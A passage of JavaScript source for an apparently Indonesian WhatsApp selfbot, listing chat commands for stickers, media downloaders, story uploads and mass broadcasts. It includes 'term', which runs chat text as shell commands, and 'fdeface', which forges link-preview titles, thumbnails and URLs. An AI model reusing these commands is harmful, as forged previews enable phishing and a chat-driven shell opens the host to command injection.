            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
            if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
            if (!q) return fakestatus('Isi teksnya!')
            alpha.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
            if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await alpha.downloadMediaMessage(swsw)
            alpha.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            alpha.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
    case 'upswvideo':
            if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            cihcih = await alpha.downloadMediaMessage(swsw)
            alpha.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            alpha.sendMessage(from, bur, text, { quoted: mek })
            } else {
            fakestatus('reply videonya!')
            }
            break
     case 'bc':
     case 'broadcast':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
if (!q)return reply(`Reply image , video , atau teks biasa dan Masukan Ingfo`)
bcc = await alpha.chats.all()
if (isMedia && !sen.message.imageMessage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
let media = await alpha.downloadMediaMessage(encmedia)
for (let i of bcc){
alpha.sendMessage(i.jid, media, image, {contextInfo: { forwardingScore: 9999, isForwarded:true},caption: `*BROADCAST*${enter}${enter}${q}`})
}
reply(`Sukses`)
} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await alpha.downloadMediaMessage(encmedia)
for (let _ of bcc) {
alpha.mekdMessage(_.jid, bc, video, {caption: `*BROADCAST*${enter}${enter}${q}`})
}
reply('Suksess broadcast')
}	else {
for (let _ of bcc) {
sendMess(_.jid, `*BROADCAST*${enter}${enter}${q}`)
	}
reply(`Succses BroadCast ${totalchat.length} Total chat`)
		}
break
     case 'bcgroup': 
     case 'bcgc': 
			if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
                    if (args.length < 1) return reply(`Untuk broadcast ke semua group ketik:${enter}${prefix}bcgroup [isi chat]`)
                    var group = await alpha.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
		ini_bc = args.join(' ')
		var groupz = await alpha.chats.all().filter(v => v.jid.endsWith('g.us'))
                    reply(`Broadcast in progress! Total: ${groupz.length} groups`)
                    let count = 0
                   for (let _ of groupz) {
                 alpha.sendMessage(_.jid, `*BROADCAST* ${enter}${enter}${ini_bc}`, text, { contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
					}
					reply('```Success Broadcast```')
	case 'bcsticker':
case 'bcstik':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break
case 'bcvideo':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftoko,caption: `*BROADCAST*${enter}${enter}${body.slice(9)}`})
						}
						fakestatus('Suksess broadcast')
					}
					break
	case 'bcaudio':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko})
						}
						fakestatus('Suksess broadcast')
					}
					break
case 'bcgif':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return fakestatus('```OWNER ONLY```')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            const tipes = await alpha.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anuu = {
        	detectLinks: false
    		}
    		var mat = await alpha.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		alpha.sendMessage(from, mat, MessageType.extendedText, anuu)
            break
    case 'antibug':
          if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
          if (args[0] === 'on') {
          if (bugc === true) return
          bugc = true
          antitrol = true
          reply('Berhasil menyalakan antibug')
          } else if (args[0] === 'off') {
          if (bugc === false) return
          bugc = false
          antitrol = false
          reply('Berhasil mematikan antibug')
          } else {
          reply('Pilih on atau off')
          }
          break
    case 'public':
          	if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
          	if (banChats === false) return
          	banChats = false
          	fakeitem(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
          	if (banChats === true) return
          	banChats = true
          	fakeitem(`「 *SELF-MODE* 」`)
          	break
    case 'tagall':
            if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
            if (!isGroup) return reply(mess.only.group)
            members_id = []
                teks = (args.length > 0) ? body.slice(8).trim() : ''
                teks += '\n\n'
                for (let mem of groupMembers) {
                    teks += `•> @${mem.jid.split('@')[0]}\n`
                    members_id.push(mem.jid)
                }
                mentions(teks, members_id, true)
            break
 	case 'hidetag':
			if (!mek.key.fromMe && !isOwner && !isGroupAdmins) return reply('Admin Group Only')
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await alpha.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: mek
			}
			alpha.sendMessage(from, optionshidetag, text)
			break
	case 'play':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            reply(mess.wait)
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*YT MUSIC*${enter}${enter}*Title* : ${title}${enter}*Ext* : MP3${enter}*Filesize* : ${filesizeF}${enter}*Link* : ${a.data}${enter}${enter}_For the duration of more than the limit is presented in the form of a link_`)
                        const captions = `*YT MUSIC*${enter}${enter}*Title* : ${title}${enter}*Ext* : MP3${enter}*Size* : ${filesizeF}${enter}*Link* : ${a.data}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break  
        case 'video':
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            reply(mess.wait)
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*YT VIDEO*${enter}${enter}*Title* : ${title}${enter}*Ext* : MP3${enter}*Filesize* : ${filesizeF}${enter}*Link* : ${a.data}${enter}${enter}_For the duration of more than the limit is presented in the form of a link_`)
                        const captions = `*YT VIDEO*${enter}${enter}*Title* : ${title}${enter}*Ext* : MP4${enter}${enter}*Size* : ${filesizeF}${enter}*Link* : ${a.data}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   break      
    case 'sticker': 
    case 'stiker':
    case 'sg':
    case 's':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await alpha.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                alpha.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await alpha.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            alpha.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                reply(`Kirim gambar dengan caption ${prefix}sticker${enter}Durasi Sticker Video 1-9 Detik`)
            }
            break               
    case 'toimg':
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await alpha.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await alpha.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *WHATSAPP BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
                        if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			reply(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
                if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await alpha.downloadMediaMessage(boij)
			fs.writeFileSync(fs.readFileSync(`./image/${fakethumb}`), delb)
			reply('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
                if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await alpha.downloadMediaMessage(boij)
			fs.writeFileSync(fs.readFileSync(`./image/${thumbnail}`), delb)
			reply('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break
case 'ytmp4':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
					let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
					if (!isLinks2) return reply(mess.error.Iv)
						try {
						reply(mess.wait)
						ytv(args[0])
						.then((res) => {
						const { dl_link, thumb, title, filesizeF, filesize } = res
						axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
						.then((a) => {
						if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*${enter}${enter}*Title* : ${title}${enter}*Ext* : MP3${enter}*Filesize* : ${filesizeF}${enter}*Link* : ${a.data}${enter}${enter}_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
						const captionsYtmp4 = `*Data Berhasil Didapatkan!*${enter}${enter}*Title* : ${title}${enter}*Ext* : MP4${enter}*Size* : ${filesizeF}${enter}${enter}_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
						sendMediaURL(from, thumb, captionsYtmp4)
						sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
						})		
						})
						} catch (err) {
					    reply(mess.error.api)
						}
						break
case 'emoji':
if (!q) return fakegroup('emojinya?')
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[4].url}`
sendStickerFromUrl(from,`${teks}`)	
console.log(teks)
})
break
case 'ytmp3':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
					let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
					if (!isLinks) return reply(mess.error.Iv)
						try {
						reply(mess.wait)
						yta(args[0])
						.then((res) => {
						const { dl_link, thumb, title, filesizeF, filesize } = res
						axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
						.then((a) => {
					    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*${enter}${enter}*Title* : ${title}${enter}*Ext* : MP3${enter}*Filesize* : ${filesizeF}${enter}*Link* : ${a.data}${enter}${enter}_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
						const captions = `*💞 YTMP3*${enter}${enter}*Title* : ${title}${enter}*Ext* : MP3${enter}*Size* : ${filesizeF}${enter}${enter}_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
						sendMediaURL(from, thumb, captions)
						sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
						})
						})
						} catch (err) {
						reply(mess.error.api)
						}
						break
    case 'image':
            if (args.length < 1) return reply('Masukan teks!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            alpha.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
case 'ttmp4':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(mess.wait)
hx.ttdownloader(lin).then(res => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP4*${enter}${enter}•> Nowm : ${res.nowm}${enter}•> Wm : ${res.wm}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, anu, 'Done!')
})
break
case 'ttmp3':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(mess.wait)
hx.ttdownloader(lin).then(async (res) => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP3*${enter}${enter}•> Nowm : ${res.nowm}${enter}•> Wm : ${res.wm}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(anu)
alpha.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp3', filename:'alpha.mp3', ptt:true})
})
break
    case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `${enter}*「 _BRAINLY_ 」*${enter}${enter}*•> Pertanyaan:* ${Y.pertanyaan}${enter}${enter}*•> Jawaban:* ${Y.jawaban[0].text}${enter}❉──────────────────❉${enter}`
			}
			alpha.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
            })              
			break
	    case 'ig':
if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(mess.wait)
hx.igdl(lin).then(res => {
console.log('[ INSTAGRAM ] downloader')
Anu = res[0].downloadUrl
fto = fs.readFileSync(`./image/${thumbnail}`)
alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*INSTAGRAM MP4*\n\n•> Priview : ${res[0].preview}\n•> Link : ${res[0].url}\n•> Linkdl : ${res[0].downloadUrl}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
    case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}${enter}*Username* : ${args.join('')}${enter}*Full Name* : ${Y.full_name}${enter}*Bio* : ${Y.biography}${enter}*Followers* : ${Y.followers}${enter}*Following* : ${Y.following}${enter}*Private* : ${Y.is_private}${enter}*Verified* : ${Y.is_verified}${enter}${enter}*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
case 'fbmp4':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(mess.wait)
hx.fbdown(lin).then(res => {
console.log('[ FACEBOOK ] downloader')
Anu = res.HD
fto = fs.readFileSync(`./image/${thumbnail}`)

alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*FACEBOOK MP4*${enter}•> Normal : ${res.Normal_video}${enter}•> Hd : ${res.HD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
case 'fbmp3':
if (args.length < 1) return reply('Link?')
lin = args[0]
reply(mess.wait)
hx.fbdown(lin).then(async (res) => {
console.log('[ FACEBOOK ] downloader')
Anu = res.HD
fto = fs.readFileSync(`./image/${thumbnail}`)

alpha.sendMessage(from, fto, image, {quoted:mek, caption:`*FACEBOOK MP3*${enter}${enter}•> Normal : ${res.Normal_video}${enter}•> Hd : ${res.HD}${enter}•> Audio : ${res.audio}${enter}${enter}_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:fs.readFileSync(`./image/${thumbnail}`), contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
alpha.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp4', filename:'alphagans.mp3', ptt:true})
})
break
	case 'term':
                        if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			reply(stdout)
			}
			})
		    break 
    case 'join':
    if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
            if (args.length < 1) return reply('Linknya?')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
let { size } = await alpha.query({ 
            json: ["query", "invite",net],
            expect200:true })
            if (size < 50) {
            reply('Minimal member harus 50 orang')
            } else if (size > 50) {
             try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            var codeInvite = cos.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await alpha.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            fakegroup('LINK ERROR!')
            }
            } else {
            reply('Error!')
            }
            break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await twitterGetUrl(`${ten}`)
            .then(g => {
            ren = `${g.download[2].url}`
            sendMediaURL(from,ren,'DONE')
            })
            break
    case 'runtime':
    case 'test':
            teks = `${kyun(run)}${enter}${enter}「 *SELFBOT* 」`
            fakegroup(teks)
            break  
	case 'speed':
	case 'ping':			
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `${petik}${teks}Speed: ${latensi.toFixed(4)} Second${petik}`
			fakegroup(pingnya)
			})
			break  
    case 'totag':
    if (!isOwner && !isCoOwner && !mek.key.fromMe) return reply('Lu siapa jir 🤔')
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await alpha.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            alpha.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await alpha.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            alpha.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await alpha.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            alpha.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await alpha.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            alpha.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'tomp4':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await alpha.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await alpha.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    case 'inspect':
            try {
